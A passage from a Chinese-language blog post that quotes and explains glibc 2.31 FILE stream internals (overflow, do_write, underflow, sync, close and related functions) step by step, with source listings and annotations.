f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line"> f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure><ol><li>判断文件流是否设置_IO_NO_WRITES,是则标记错误并返回</li><li><ul><li>如果文件不处于写入模式(_IO_CURRENTLY_PUTTING)或者_IO_write_base为空<ul><li>如果是_IO_write_base为空的情况,先通过_IO_doallocbuf申请buf缓冲区,并设置read指针</li><li>如果文件流正在备份(_IO_IN_BACKUP)<ul><li>调用_IO_free_backup_area (f)</li><li>f-&gt;_IO_read_base减去f-&gt;_IO_read_end - f-&gt;_IO_read_ptr和f-&gt;_IO_read_base - f-&gt;_IO_buf_base中更小的那个</li><li>f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</li></ul></li><li>如果f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end,将f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</li><li>将w-ptr和w-base设置为r-ptr,w-end设置为b-end,r-base和r-ptr设置为r-end(之后这些指针一般用简写)</li><li>设置_IO_CURRENTLY_PUTTING位</li><li>若文件流是行缓冲或无缓冲模式且非宽字符w-end=w-ptr</li></ul></li></ul></li><li>如果参数ch为EOF,调用_IO_do_write</li><li>如果w-ptr==b-end,调用_IO_do_flush如果返回EOF则直接return EOF</li><li>*f-&gt;_IO_write_ptr++=ch</li><li>如果文件是无缓冲或者是行缓冲且ch为’\n’,调用_IO_do_write如果返回EOF则直接return EOF</li><li>返回ch</li></ol><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">  || (<span class="type">size_t</span>) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br></pre></td></tr></table></figure><p>如果to_do==0直接返回1</p><p>否则调用new_do_write (fp, data, to_do)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);<span class="comment">//读写平衡</span></span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)<span class="comment">//计算最后一行第几列</span></span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>如果_IO_IS_APPENDING被置位，说明文件对象是以追加方式打开的，所以将fp-&gt;_offset赋值为_IO_pos_BAD，即定位到文件末尾；</p></li><li><p>如果不是追加模式，就要考虑读写buffer块地址的信息了，读的尾指针不等于写的基指针，说明之前读写过程不一致，现在我们需要写入信息，所以需要调用_IO_SYSSEEK进行调整，基于当前的位置（1表示SEEK_CUR）将两者调整到一致。</p><ul><li>如果返回结果是异常的-1，那就直接返回0，表示写入字节数为0.</li><li>否则使用新的位置信息更新fp-&gt;_offset</li></ul></li><li>调用系统调用_IO_SYSWRITE (fp, data, to_do);</li><li>如果当前列参数不等于0(即第一列)，而且写入的字符数不等于0，此时需要更新列参数，调用_IO_adjust_column函数实现。</li><li>调用_IO<em>setg将读相关的base、ptr、end更新为_IO_buf_base；然后将写相关的base、ptr更新为_IO_buf_base。</em></li></ul><p>注意最后的w-end会根据当前的模式选择是等于_IO_buf_base还是_IO_buf_end：</p><ul><li>如果fp-&gt;_mode &lt;= 0，说明是标准字符，fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED)说明是按行为buffer单位或没有缓存buffer，这种情况将写end置为_IO_buf_base，即无法使用buffer，否则则是可以使用buffer的情况，置为_IO_buf_end，可以使用base到end这块空间作为写缓存。</li></ul><p>看一下col调整函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span></span><br><span class="line">_IO_adjust_column (<span class="type">unsigned</span> start, <span class="type">const</span> <span class="type">char</span> *line, <span class="type">int</span> count)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = line + count;</span><br><span class="line">  <span class="keyword">while</span> (ptr &gt; line)</span><br><span class="line">    <span class="keyword">if</span> (*--ptr == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> line + count - ptr - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> start + count;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_adjust_column)</span><br></pre></td></tr></table></figure><p>就是更新最后一行的列</p><ul><li><p>首先ptr指向真正写入的最后一个字符；</p></li><li><p>当ptr大于line，即从后向前遍历字符，如果找到换行符，则结束，说明之前遍历的位于写入的最后一行，此时line + count - ptr - 1表示最后一行的字符数，返回该值即可；</p></li><li><p>如果没有找到换行符，那就返回start + count，即之前的列号加真正写入的字符数。</p></li></ul><p>最后在外层再加1得到当前行的列号，整体的逻辑就是要更新当前的列号。</p><h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span></span><br><span class="line">_IO_file_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (__builtin_expect (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL, <span class="number">0</span>)</span><br><span class="line">  ? __read_nocancel (fp-&gt;_fileno, buf, size)</span><br><span class="line">  : __read (fp-&gt;_fileno, buf, size));</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_read)</span><br></pre></td></tr></table></figure><p>就是调用系统调用</p><h2 id="seek"><a href="#seek" class="headerlink" title="seek"></a>seek</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_file_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __lseek64 (fp-&gt;_fileno, offset, dir);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_seek)</span><br></pre></td></tr></table></figure><p>seek就是调用lseek</p><p>返回成功后的偏移地址如果错误返回-1</p><h2 id="stat-1"><a href="#stat-1" class="headerlink" title="stat"></a>stat</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_stat (FILE *fp, <span class="type">void</span> *st)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fxstat64 (_STAT_VER, fp-&gt;_fileno, (<span class="keyword">struct</span> stat64 *) st);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_stat)</span><br></pre></td></tr></table></figure><p>调用stat系统调用</p><p>返回一个stat结构体</p><h2 id="underflow"><a href="#underflow" class="headerlink" title="underflow"></a>underflow</h2><p>underflow主要负责从文件中读取数据到缓冲区</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment"> required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment"> traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment"> not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment"> explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">_IO_OVERFLOW (<span class="built_in">stdout</span>, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<span class="comment">//注意读的大小是缓冲区的大小,这意味r-end可能会向后移动很多,从而导致读写不一致(_offset偏后)</span></span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment"> handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment"> unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)</span><br></pre></td></tr></table></figure><ol><li><p>如果已经到达文件末尾返回EOF</p></li><li><p>如果文件不允许读,设置错误并返回EOF</p></li><li><p>如果r-ptr&lt;r-end返回r-ptr指向的字符</p></li><li><p>如果buf为空</p><ul><li>如果_IO_save_base不为空先将其释放,并取消_IO_IN_BACKUP标志位</li><li>申请buf</li></ul></li><li><p>如果是行缓冲或无缓冲模式</p><ul><li>给stdout上锁</li><li>如果stdout是行缓冲且在_IO_list_all链上且不禁止写,对stdout调用overflow</li><li>将stdout解锁</li></ul></li><li><p>调用_IO_switch_to_get_mode (fp);</p></li><li><p>更新读写缓冲区所有指针为fp-&gt;_IO_buf_base</p></li><li><p>调用系统调用_IO_SYSREAD(fp, fp-&gt;_IO_buf_base,</p><p>​      fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</p></li><li><p>,返回值为count</p></li><li><p>如果count&lt;=0</p><ul><li>如果count为0,文件标志设置到达末尾</li><li>如果count小于0,设置错误标志,并将count置为0</li></ul></li><li><p>r-end向后移动count</p></li><li><p>如果count为0,将fp-&gt;_offset设置为-1(文件末尾)并返回EOF</p></li><li><p>如果fp-&gt;_offset不为-1,fp-&gt;_offset移动到当前位置向后count字节</p></li><li><p>返回r-ptr指向的字符</p></li></ol><p>看以下其中调用的_IO_switch_to_get_mode (fp);</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_get_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    fp-&gt;_IO_read_base = fp-&gt;_IO_backup_base;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_IO_read_base = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_IO_read_ptr = fp-&gt;_IO_write_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end = fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_CURRENTLY_PUTTING;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_switch_to_get_mode)</span><br></pre></td></tr></table></figure><ol><li>如果w-ptr&gt;w-base说明输出缓冲区还有数据尚未写入文件,调用_IO_OVERFLOW (fp, EOF)</li><li>如果处于备份模式fp-&gt;_IO_read_base = fp-&gt;_IO_backup_base;<ul><li>否则fp-&gt;_IO_read_base = fp-&gt;_IO_buf_base;<ul><li>如果w-ptr&gt;r-end,r-end=w-ptr</li></ul></li></ul></li><li>r-ptr被赋值为w-ptr,write的所有指针置为r-ptr</li><li>取消文件流的_IO_CURRENTLY_PUTTING标志位</li></ol><p>感觉有些指针操作有些多余了,underflow外层中都会统一更新赋值</p><h2 id="uflow"><a href="#uflow" class="headerlink" title="uflow"></a>uflow</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_default_uflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> ch = _IO_UNDERFLOW (fp);</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr++;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_uflow)</span><br></pre></td></tr></table></figure><ol><li>调用underflow</li><li>如果underflow返回值为EOF,返回EOF</li><li>否则返回fp-&gt;_IO_read_ptr处的字符</li></ol><h2 id="sync-1"><a href="#sync-1" class="headerlink" title="sync"></a>sync</h2><p>sync负责平衡读写,将未写入的数据写入文件,将未读取的数据去除</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(fp)) <span class="keyword">return</span> EOF;</span><br><span class="line">  delta = fp-&gt;_IO_read_ptr - fp-&gt;_IO_read_end;<span class="comment">//读平衡,真正只读到ptr,但实际读到end</span></span><br><span class="line">  <span class="keyword">if</span> (delta != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos = _IO_SYSSEEK (fp, delta, <span class="number">1</span>);<span class="comment">//将多余的去除</span></span><br><span class="line">      <span class="keyword">if</span> (new_pos != (<span class="type">off64_t</span>) EOF)</span><br><span class="line">fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;<span class="comment">//平衡</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (errno == ESPIPE)</span><br><span class="line">; <span class="comment">/* Ignore error from unseekable devices. */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">retval = EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (retval != EOF)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="comment">/* <span class="doctag">FIXME:</span> Cleanup - can this be shared? */</span></span><br><span class="line">  <span class="comment">/*    setg(base(), ptr, ptr); */</span></span><br><span class="line">  <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_sync, _IO_file_sync)</span><br></pre></td></tr></table></figure><ol><li>如果write缓冲区有未写入的,调用_IO_do_flush不成功写入或写入不完全则直接返回EOF</li><li>平衡read指针</li></ol><h2 id="imbue"><a href="#imbue" class="headerlink" title="imbue"></a>imbue</h2><p>在2.31中是个空函数</p><h2 id="showmanyc"><a href="#showmanyc" class="headerlink" title="showmanyc"></a>showmanyc</h2><p>在2.31中是个空函数</p><h2 id="close"><a href="#close" class="headerlink" title="close"></a>close</h2><p>关闭文件流</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_close_it (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> write_status;</span><br><span class="line">  <span class="keyword">if</span> (!_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_NO_WRITES) == <span class="number">0</span></span><br><span class="line">      &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != <span class="number">0</span>)</span><br><span class="line">    write_status = _IO_do_flush (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    write_status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  _IO_unsave_markers (fp);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == <span class="number">0</span></span><br><span class="line">      ? _IO_SYSCLOSE (fp) : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_wbackup 